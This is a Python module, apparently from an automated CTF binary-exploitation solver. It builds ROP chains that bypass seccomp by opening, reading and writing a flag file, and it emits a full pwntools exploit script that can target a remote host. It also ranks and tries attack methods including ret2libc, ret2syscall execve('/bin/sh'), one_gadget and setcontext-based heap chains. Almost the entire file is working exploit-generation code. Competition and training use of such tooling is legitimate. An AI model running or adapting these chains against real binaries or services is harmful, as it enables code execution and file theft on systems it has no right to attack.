#!/usr/bin/env python3
"""
自动ORW引擎 — seccomp环境下自动构造open/read/write链
多种利用方法组合引擎
"""

import os, re, subprocess, textwrap
from pwn import *

class ORWEngine:
    """自动构造ORW(open/read/write)链绕过seccomp"""
    
    def __init__(self, binary_path, libc_path=None, verbose=True):
        self.binary_path = binary_path
        self.libc_path = libc_path
        self.verbose = verbose
        self.elf = ELF(binary_path, checksec=False)
        self.libc = ELF(libc_path, checksec=False) if (libc_path and os.path.exists(libc_path)) else None
        
    def log(self, msg, level='info'):
        if self.verbose:
            getattr(log, level)(f"  [orw] {msg}")
    
    def find_syscall_gadget(self):
        """寻找syscall; ret gadget — 使用ROPgadget + objdump双重搜索"""
        # 方法1: ROPgadget
        for target in [self.binary_path, self.libc_path]:
            if not target: continue
            gadgets = self._find_gadgets(target)
            for g in gadgets:
                if 'syscall' in g.lower() and 'ret' in g.lower():
                    m = re.search(r'(0x[0-9a-f]+)', g)
                    if m:
                        return int(m.group(1), 16)
        
        # 方法2: objdump直接搜索 syscall + ret 字节序列
        for target in [self.binary_path, self.libc_path]:
            if not target or not os.path.exists(target): continue
            try:
                result = subprocess.run(
                    ['objdump', '-d', target],
                    capture_output=True, text=True, timeout=60
                )
                lines = result.stdout.split('\n')
                for i, line in enumerate(lines):
                    if 'syscall' in line:
                        # 检查下一行是否是ret
                        if i+1 < len(lines) and 'ret' in lines[i+1]:
                            m = re.search(r'^\s*([0-9a-f]+):', line)
                            if m:
                                addr = int(m.group(1), 16)
                                self.log(f"找到syscall;ret @ {hex(addr)} (objdump)", 'success')
                                return addr
            except:
                pass
        
        return None
    
    def find_pop_gadgets(self):
        """找所有需要的pop gadgets"""
        gadgets = self._find_gadgets(self.binary_path)
        if self.libc:
            gadgets += self._find_gadgets(self.libc_path)
        
        found = {'pop_rax': None, 'pop_rdi': None, 'pop_rsi': None, 'pop_rdx': None}
        
        for g in gadgets:
            insns = g.split(':', 1)[1].strip().lower() if ':' in g else ''
            try:
                addr = int(g.split(':')[0].strip(), 16)
            except: continue
            
            if not found['pop_rax'] and 'pop rax' in insns and 'ret' in insns:
                found['pop_rax'] = addr
            if not found['pop_rdi'] and 'pop rdi' in insns and 'ret' in insns:
                found['pop_rdi'] = addr
            if not found['pop_rsi'] and 'pop rsi' in insns and 'ret' in insns:
                found['pop_rsi'] = addr
            if not found['pop_rdx'] and 'pop rdx' in insns and 'ret' in insns:
                found['pop_rdx'] = addr
        
        return found
    
    def _find_gadgets(self, target):
        try:
            result = subprocess.run(
                ['ROPgadget', '--binary', target],
                capture_output=True, text=True, timeout=60
            )
            return [l.strip() for l in result.stdout.split('\n') if ':' in l]
        except:
            return []
    
    def find_writable_addr(self):
        """找可写内存区域(BSS段)"""
        for seg in self.elf.segments:
            if seg.header.p_type == 'PT_LOAD' and seg.header.p_flags & 2:  # writable
                # BSS通常在最后一个load段之后
                end = seg.header.p_vaddr + seg.header.p_memsz
                return end
        return 0x600000  # fallback
    
    def generate_orw_chain(self, offset=0x40, filename=b"flag\x00"):
        """
        生成完整ORW ROP链
        返回: (payload_bytes, 需要的gadgets_dict)
        """
        self.log("构造ORW链: open('flag') → read → write")
        
        gadgets = self.find_pop_gadgets()
        syscall = self.find_syscall_gadget()
        writable = self.find_writable_addr()
        
        missing = []
        for name in ['pop_rax', 'pop_rdi', 'pop_rsi', 'pop_rdx']:
            if not gadgets[name]:
                missing.append(name)
        if not syscall:
            missing.append('syscall')
        
        if missing:
            self.log(f"缺少gadgets: {missing}", 'warning')
            return None, {'missing': missing, 'gadgets': gadgets, 'syscall': syscall}
        
        self.log(f"gadgets: rax={hex(gadgets['pop_rax'])}, rdi={hex(gadgets['pop_rdi'])}, "
                f"rsi={hex(gadgets['pop_rsi'])}, rdx={hex(gadgets['pop_rdx'])}, "
                f"syscall={hex(syscall)}", 'success')
        
        # 构造ORW链
        chain = b''
        buf1 = writable + 0x100  # flag字符串位置
        buf2 = writable + 0x200  # read缓冲区
        
        # Stage 1: open("flag", O_RDONLY, 0)
        # rax=2, rdi=buf1, rsi=0, rdx=0
        chain += p64(gadgets['pop_rax']) + p64(2)       # SYS_open
        chain += p64(gadgets['pop_rdi']) + p64(buf1)     # filename
        chain += p64(gadgets['pop_rsi']) + p64(0)        # O_RDONLY
        chain += p64(gadgets['pop_rdx']) + p64(0)        # mode
        chain += p64(syscall)                             # syscall → fd in rax
        
        # Stage 2: read(fd, buf2, 0x100)
        # rax=0, rdi=fd(assume 3), rsi=buf2, rdx=0x100
        chain += p64(gadgets['pop_rax']) + p64(0)        # SYS_read
        chain += p64(gadgets['pop_rdi']) + p64(3)        # fd=3 (often)
        chain += p64(gadgets['pop_rsi']) + p64(buf2)     # buffer
        chain += p64(gadgets['pop_rdx']) + p64(0x100)    # count
        chain += p64(syscall)                             # syscall
        
        # Stage 3: write(1, buf2, 0x100)
        # rax=1, rdi=1, rsi=buf2, rdx=0x100
        chain += p64(gadgets['pop_rax']) + p64(1)        # SYS_write
        chain += p64(gadgets['pop_rdi']) + p64(1)        # stdout
        chain += p64(gadgets['pop_rsi']) + p64(buf2)     # buffer
        chain += p64(gadgets['pop_rdx']) + p64(0x100)    # count
        chain += p64(syscall)                             # syscall
        
        # 构造完整payload
        payload = b'A' * offset + chain
        flags = {'filename_addr': buf1, 'read_buf': buf2, 'filename': filename}
        
        self.log(f"ORW链: {len(chain)} bytes", 'success')
        return payload, {
            'gadgets': gadgets,
            'syscall': syscall,
            'offset': offset,
            'filename_addr': buf1,
            'read_buf': buf2,
            'flags': flags,
        }
    
    def generate_exploit(self, offset=0x40):
        """生成完整的pwntools exploit脚本"""
        payload, info = self.generate_orw_chain(offset)
        if not payload:
            return None
        
        gadgets = info['gadgets']
        syscall = info['syscall']
        
        code = textwrap.dedent(f'''\
#!/usr/bin/env python3
"""ORW Exploit — Auto-generated by PwnSolver ORW Engine
绕过seccomp: open('flag') → read → write
"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

BINARY = {repr(self.binary_path)}
LIBC_PATH = {repr(self.libc_path)}
REMOTE_HOST = None
REMOTE_PORT = None

elf = ELF(BINARY)
libc = ELF(LIBC_PATH) if LIBC_PATH else None

OFFSET = {offset}

# ORW gadgets
POP_RAX = {hex(gadgets['pop_rax'])}
POP_RDI = {hex(gadgets['pop_rdi'])}
POP_RSI = {hex(gadgets['pop_rsi'])}
POP_RDX = {hex(gadgets['pop_rdx'])}
SYSCALL = {hex(syscall)}
BUF = {hex(info['filename_addr'])}   # writable for "flag" string
BUF2 = {hex(info['read_buf'])}        # read buffer

def exploit():
    if REMOTE_HOST:
        p = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        p = process(BINARY)
    
    # ORW: open("flag") → read → write
    chain = b''
    # open("flag", 0, 0)
    chain += p64(POP_RAX) + p64(2)
    chain += p64(POP_RDI) + p64(BUF)
    chain += p64(POP_RSI) + p64(0)
    chain += p64(POP_RDX) + p64(0)
    chain += p64(SYSCALL)
    # read(3, BUF2, 0x100)
    chain += p64(POP_RAX) + p64(0)
    chain += p64(POP_RDI) + p64(3)
    chain += p64(POP_RSI) + p64(BUF2)
    chain += p64(POP_RDX) + p64(0x100)
    chain += p64(SYSCALL)
    # write(1, BUF2, 0x100)
    chain += p64(POP_RAX) + p64(1)
    chain += p64(POP_RDI) + p64(1)
    chain += p64(POP_RSI) + p64(BUF2)
    chain += p64(POP_RDX) + p64(0x100)
    chain += p64(SYSCALL)
    
    payload = b'A' * OFFSET + chain
    p.send(payload + b'\\n')
    p.sendline(b"flag\\x00")  # write flag string
    
    p.interactive()

if __name__ == '__main__':
    exploit()
''')
        return code
    
    def generate_setcontext_orw_chain(self, setcontext_addr=None, setcontext_base=None,
                                      heap_base=None, flag_addr=None):
        """生成setcontext+ORW链 (Heap_Harmony_Festivity风格)
        
        通过setcontext控制寄存器后执行ORW链
        使用场景: 堆利用中通过tcache poisoning劫持rtld_global/_dl_fini
        """
        if not setcontext_addr and self.libc:
            from gadget_finder import GadgetFinder
            gf = GadgetFinder(self.binary_path, self.libc_path, verbose=False)
            sc_info = gf.find_setcontext_gadget()
            if sc_info and sc_info.get('candidates'):
                setcontext_addr = sc_info['candidates'][0]['addr']
                setcontext_base = sc_info['setcontext_base']
        
        if not setcontext_addr:
            return None, {'error': 'setcontext gadget not found'}
        
        # 找ORW所需的gadgets
        pop_gadgets = self.find_pop_gadgets()
        syscall = self.find_syscall_gadget()
        writable = self.find_writable_addr()
        
        if not all(pop_gadgets.values()) or not syscall:
            return None, {'error': 'ORW gadgets incomplete',
                         'gadgets': pop_gadgets, 'syscall': syscall}
        
        # 找ret gadget (setcontext后需要)
        ret_addr = None
        if self.libc:
            try:
                rop = ROP(self.libc)
                for g in rop.gadgets:
                    if str(g).strip() == 'ret':
                        ret_addr = g.address
                        break
            except:
                pass
        
        # ORW链
        buf = writable + 0x200
        buf2 = writable + 0x300
        
        orw_chain = b''
        # open("flag", 0)
        orw_chain += p64(pop_gadgets['pop_rax']) + p64(2)
        orw_chain += p64(pop_gadgets['pop_rdi']) + p64(buf)
        orw_chain += p64(pop_gadgets['pop_rsi']) + p64(0)
        orw_chain += p64(pop_gadgets['pop_rdx']) + p64(0)
        orw_chain += p64(syscall)
        # read(3, buf2, 0x100)
        orw_chain += p64(pop_gadgets['pop_rax']) + p64(0)
        orw_chain += p64(pop_gadgets['pop_rdi']) + p64(3)
        orw_chain += p64(pop_gadgets['pop_rsi']) + p64(buf2)
        orw_chain += p64(pop_gadgets['pop_rdx']) + p64(0x100)
        orw_chain += p64(syscall)
        # write(1, buf2, 0x100)
        orw_chain += p64(pop_gadgets['pop_rax']) + p64(1)
        orw_chain += p64(pop_gadgets['pop_rdi']) + p64(1)
        orw_chain += p64(pop_gadgets['pop_rsi']) + p64(buf2)
        orw_chain += p64(pop_gadgets['pop_rdx']) + p64(0x100)
        orw_chain += p64(syscall)
        
        return orw_chain, {
            'setcontext_addr': setcontext_addr,
            'setcontext_base': setcontext_base,
            'gadgets': pop_gadgets,
            'syscall': syscall,
            'ret_addr': ret_addr,
            'buf': buf,
            'buf2': buf2,
            'flag_addr': flag_addr,
        }


class CombinedStrategyEngine:
    """
    多种利用方法组合引擎
    不在Tier之间线性fallback，而是尝试所有可行方法的最佳组合
    
    方法池:
    1. ret2win — 直接跳转win
    2. ret2libc — system("/bin/sh")
    3. one_gadget — execve约束
    4. ORW — open/read/write (seccomp)
    5. stack pivot — 栈迁移
    6. ret2dlresolve — 伪造PLT
    """
    
    def __init__(self, solver, verbose=True):
        self.solver = solver
        self.verbose = verbose
        self.methods = []
        self.results = {}
        
    def log(self, msg, level='info'):
        if self.verbose:
            getattr(log, level)(f"  [combo] {msg}")
    
    def plan_methods(self, analysis, gadgets):
        """根据分析结果规划可行的利用方法"""
        self.log("规划利用方法...")
        
        funcs = analysis.get('functions', {})
        protections = analysis.get('protections', {})
        specific = gadgets.get('specific', {})
        has_pop_rdi = gadgets.get('pop_rdi_in_binary', False)
        has_one_gadget = bool(gadgets.get('one_gadgets'))
        has_syscall = bool(specific.get('syscall'))
        has_seccomp = self._detect_seccomp()
        
        methods = []
        
        # Method 1: ret2win (最简单)
        real_win = [(n, a) for n, a in funcs.get('win', []) 
                    if not n.startswith('_')]
        if real_win:
            methods.append({
                'name': 'ret2win',
                'priority': 100,
                'desc': f'跳转{real_win[0][0]}',
                'requires': ['win_function'],
            })
        
        # Method 2: shellcode (NX禁用)
        if not protections.get('nx', True):
            methods.append({
                'name': 'shellcode',
                'priority': 90,
                'desc': 'NX禁用→shellcode',
                'requires': [],
            })
        
        # Method 3: one_gadget (最方便)
        if has_one_gadget and not has_seccomp:
            methods.append({
                'name': 'one_gadget',
                'priority': 85,
                'desc': f'{len(gadgets["one_gadgets"])}个OG可用',
                'requires': ['libc_leak'],
            })
        
        # Method 4: ret2libc
        if has_pop_rdi and not has_seccomp:
            methods.append({
                'name': 'ret2libc',
                'priority': 80,
                'desc': 'system("/bin/sh")',
                'requires': ['libc_leak', 'pop_rdi'],
            })
        
        # Method 5: ORW (seccomp时必须)
        if has_seccomp or not has_one_gadget:
            # 检查ORW所需gadgets
            orw = ORWEngine(self.solver.binary_path, self.solver.libc_path, verbose=False)
            orw_gadgets = orw.find_pop_gadgets()
            orw_syscall = orw.find_syscall_gadget()
            
            if orw_syscall and all(orw_gadgets.values()):
                methods.append({
                    'name': 'ORW',
                    'priority': 75 if has_seccomp else 50,
                    'desc': 'open/read/write绕过seccomp',
                    'requires': ['syscall', 'pop_rax', 'pop_rdi', 'pop_rsi', 'pop_rdx'],
                    'orw_info': {'gadgets': orw_gadgets, 'syscall': orw_syscall},
                })
        
        # Method 6: ret2dlresolve (无pop_rdi时)
        if not has_pop_rdi:
            methods.append({
                'name': 'ret2dlresolve',
                'priority': 40,
                'desc': '伪造PLT解析system',
                'requires': ['writable_bss'],
            })
        
        # Method 7: setcontext+ORW (Heap_Harmony_Festivity风格)
        # 堆利用 + setcontext链 → ORW
        heap_menu = analysis.get('heap_menu', {})
        if heap_menu.get('heap_menu') and self.solver.libc_path:
            try:
                from gadget_finder import GadgetFinder
                gf = GadgetFinder(self.solver.binary_path, self.solver.libc_path, verbose=False)
                sc_info = gf.find_setcontext_gadget()
                if sc_info and sc_info.get('candidates'):
                    methods.append({
                        'name': 'setcontext_orw',
                        'priority': 70,
                        'desc': '堆利用→setcontext→ORW',
                        'requires': ['heap_leak', 'libc_leak', 'setcontext'],
                    })
            except Exception:
                pass
        
        # Method 8: ret2syscall (s.s.a.l风格)
        # 不需要libc，直接用syscall执行execve
        if has_syscall and specific.get('pop_rax') and specific.get('pop_rdi'):
            methods.append({
                'name': 'ret2syscall',
                'priority': 78,
                'desc': 'ret2syscall: execve("/bin/sh",0,0)',
                'requires': ['syscall', 'pop_rax', 'pop_rdi'],
            })
        
        # Method 9: one_gadget bruteforce (yes_or_no风格)
        # 爆破one_gadget + 清除寄存器约束
        if has_one_gadget:
            try:
                from gadget_finder import GadgetFinder
                gf = GadgetFinder(self.solver.binary_path, self.solver.libc_path, verbose=False)
                clearing = gf.find_register_clearing_gadgets()
                if clearing.get('pop_r12') or clearing.get('pop_r15'):
                    methods.append({
                        'name': 'one_gadget_bruteforce',
                        'priority': 65,
                        'desc': 'OG爆破+寄存器约束清除 (yes_or_no风格)',
                        'requires': ['libc_leak', 'register_clearing'],
                        'clearing_gadgets': clearing,
                    })
            except Exception:
                pass
        
        methods.sort(key=lambda x: x['priority'], reverse=True)
        
        names = [f"{m['name']}({m['priority']})" for m in methods]
        self.log(f"可用方法: {names}")
        return methods
    
    def _detect_seccomp(self):
        """检测是否存在seccomp"""
        plt = self.solver.gadgets.get('plt', {}) if hasattr(self.solver, 'gadgets') else {}
        return any(f in plt for f in ['seccomp_init', 'seccomp_load', 'seccomp_rule_add'])
    
    def execute_best(self, methods):
        """执行最优方法组合"""
        self.log(f"共{len(methods)}种可行方法")
        
        for method in methods:
            self.log(f"\n尝试: {method['name']} (优先级{method['priority']})")
            
            if method['name'] == 'ORW':
                result = self._try_orw(method)
            elif method['name'] == 'ret2win':
                result = self._try_ret2win(method)
            elif method['name'] == 'one_gadget':
                result = self._try_one_gadget(method)
            elif method['name'] == 'ret2libc':
                result = self._try_ret2libc(method)
            elif method['name'] == 'setcontext_orw':
                result = self._try_setcontext_orw(method)
            elif method['name'] == 'ret2syscall':
                result = self._try_ret2syscall(method)
            else:
                result = None
            
            if result:
                return result
        
        self.log("所有方法均失败", 'warning')
        return None
    
    def _try_setcontext_orw(self, method):
        """尝试setcontext+ORW链 (Heap_Harmony_Festivity风格)"""
        self.log("执行setcontext+ORW链...")
        try:
            from gadget_finder import GadgetFinder
            gf = GadgetFinder(self.solver.binary_path, self.solver.libc_path, verbose=False)
            setcontext_info = gf.find_setcontext_gadget()
            
            if not setcontext_info or not setcontext_info.get('candidates'):
                self.log("未找到setcontext gadget")
                return None
            
            # 选择第一个可用candidate
            sc = setcontext_info['candidates'][0]
            self.log(f"使用 {sc['name']} @ {hex(sc['addr'])}")
            
            # 生成setcontext-based ROP
            orw = ORWEngine(self.solver.binary_path, self.solver.libc_path, verbose=False)
            chain, info = orw.generate_setcontext_orw_chain(
                setcontext_addr=sc['addr'],
                setcontext_base=setcontext_info['setcontext_base']
            )
            
            if chain and info:
                # setcontext chain must be used with heap exploitation
                # Return chain info for heap_exploit module integration
                self.log(f"setcontext+ORW chain ready ({len(chain)} bytes)", 'success')
                return {'method': 'setcontext_orw', 'chain': chain, 'info': info}
        except Exception as e:
            self.log(f"setcontext+ORW失败: {e}")
        return None
    
    def _try_ret2syscall(self, method):
        """尝试ret2syscall链 (s.s.a.l风格)"""
        self.log("执行ret2syscall...")
        try:
            from gadget_finder import GadgetFinder
            gf = GadgetFinder(self.solver.binary_path, self.solver.libc_path, verbose=False)
            chain_info = gf.generate_ret2syscall_chain()
            
            if 'error' not in chain_info:
                self.log("ret2syscall链生成成功", 'success')
                return {'method': 'ret2syscall', 'chain': chain_info}
        except Exception as e:
            self.log(f"ret2syscall失败: {e}")
        return None
    
    def _try_orw(self, method):
        """尝试ORW"""
        self.log("执行ORW...")
        orw_info = method.get('orw_info', {})
        gadgets = orw_info.get('gadgets', {})
        syscall = orw_info.get('syscall')
        
        if not all(gadgets.values()) or not syscall:
            self.log("ORW gadgets不完整")
            return None
        
        try:
            orw = ORWEngine(self.solver.binary_path, verbose=self.verbose)
            code = orw.generate_exploit()
            if code:
                self.log("ORW exploit生成成功", 'success')
                return {'method': 'ORW', 'code': code}
        except Exception as e:
            self.log(f"ORW失败: {e}")
        return None
    
    def _try_ret2win(self, method):
        return None  # 框架已有
    
    def _try_one_gadget(self, method):
        return None  # 框架已有
    
    def _try_ret2libc(self, method):
        return None  # 框架已有
